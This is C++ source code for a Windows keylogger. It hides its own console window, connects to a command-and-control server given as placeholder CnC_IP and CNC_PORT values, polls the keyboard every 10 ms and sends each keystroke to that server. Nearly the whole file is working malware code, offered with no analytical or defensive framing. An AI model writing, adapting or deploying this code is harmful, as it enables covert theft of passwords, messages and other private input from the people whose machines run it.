#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE); // do not show (hide) this program window
    char KEY; // var for key
    WSADATA WSAData; // declaring 
    SOCKET server; // declare socket
    SOCKADDR_IN addr; // declare var for address
    WSAStartup(MAKEWORD(2, 0), &WSAData); // o
    server = socket(AF_INET, SOCK_STREAM, 0); //define socket
    addr.sin_addr.s_addr = inet_addr("CnC_IP"); // set cnc IP (uses hardcoded value like 1.1.1.1)
    addr.sin_family = AF_INET; // ipv4
    addr.sin_port = htons(CNC_PORT); // set cnc port (Also hardcoded value, 1-65535)
    connect(server, (SOCKADDR *)&addr, sizeof(addr)); // connect to cnc server
    
    
    while (true) { 
            Sleep(10); // catch keys every 10ms
            for (int KEY = 0x8; KEY < 0xFF; KEY++)  // only valid keys
            {
                if (GetAsyncKeyState(KEY) == -32767) { // if a key is pressed, 0 is button up -32767 is button down
                    char buffer[2]; // hold it in a var array called buffer	
                    buffer[0] = KEY; // pass the key into the variale
                    send(server, buffer, sizeof(buffer), 0); // send the keystroke to cnc
                    std::
					cout << KEY;
            }
            } }
            
            closesocket(server); //close socket
WSACleanup(); //clean up Winsock 
}
